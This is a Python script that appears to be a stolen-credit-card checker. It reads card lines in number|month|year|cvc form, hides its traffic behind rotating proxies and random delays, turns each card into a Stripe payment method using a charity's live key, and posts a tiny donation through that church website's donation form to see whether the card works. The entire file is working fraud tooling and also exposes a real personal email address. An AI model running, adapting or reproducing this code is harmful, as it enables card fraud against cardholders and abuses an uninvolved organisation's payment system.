import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))
        
        

        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        # data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=284765b7-69d6-481a-b4ed-9dd3277fbb75cd92ed&muid=953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0&sid=eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc&pasted_fields=number&payment_user_agent=stripe.js%2F064d3d4e55%3B+stripe-js-v3%2F064d3d4e55%3B+card-element&referrer=https%3A%2F%2Fkimsharris.com&time_on_page=28864&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'
        data = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=56e0d211-59ab-443c-8553-fc1c77a637c2780e2d&sid=279a9f28-db38-4e50-a780-0e5af4a341195c1724&payment_user_agent=stripe.js%2F13dc22628e%3B+stripe-js-v3%2F13dc22628e%3B+card-element&referrer=https%3A%2F%2Fstandrewshk.org&time_on_page=24075&key=pk_live_51HjfmHC6Cusp93TKl1UTLEiUyMTWL0F56dF1RB8Ql2LbLYQ3ymHBnsQl5oUMCeDZMXN9QUEn34qo25ISwvtV1dVY00Gf8NbxwG"
        r1 = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxies=genProxy(),
        )

        pm = r1.json()["id"]
        

        cookies = {
            'ac_enable_tracking': '1',
            'prism_650299995': '3e924231-b234-4bd5-b6b7-95d27402c4bc',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2024-11-22%2010%3A08%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fstandrewshk.org%2Fpiping-and-drummjng-scholarship%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_first_add': 'fd%3D2024-11-22%2010%3A08%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fstandrewshk.org%2Fpiping-and-drummjng-scholarship%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
            '__stripe_mid': '56e0d211-59ab-443c-8553-fc1c77a637c2780e2d',
            '__stripe_sid': '279a9f28-db38-4e50-a780-0e5af4a341195c1724',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fstandrewshk.org%2Fpiping-and-drummjng-scholarship%2F',
        }
        
        headers = {
            'authority': 'standrewshk.org',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://standrewshk.org',
            'referer': 'https://standrewshk.org/piping-and-drummjng-scholarship/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {
            't': '1732270221477',
        }
        
        data = {
            'data': f'__fluent_form_embded_post_id=2232&_fluentform_45_fluentformnonce=b5b497043d&_wp_http_referer=%2Fpiping-and-drummjng-scholarship%2F&names%5Bfirst_name%5D=Thu&names%5Blast_name%5D=Kyi&email=thur07656%40gmail.com&custom-payment-amount=0.1&payment_method=stripe&item__45__fluent_checkme_=&__stripe_payment_method_id={pm}',
            'action': 'fluentform_submit',
            'form_id': '45',
        }

        r2 = requests.post(
            "https://standrewshk.org/wp-admin/admin-ajax.php",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=genProxy(),
        )
        
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
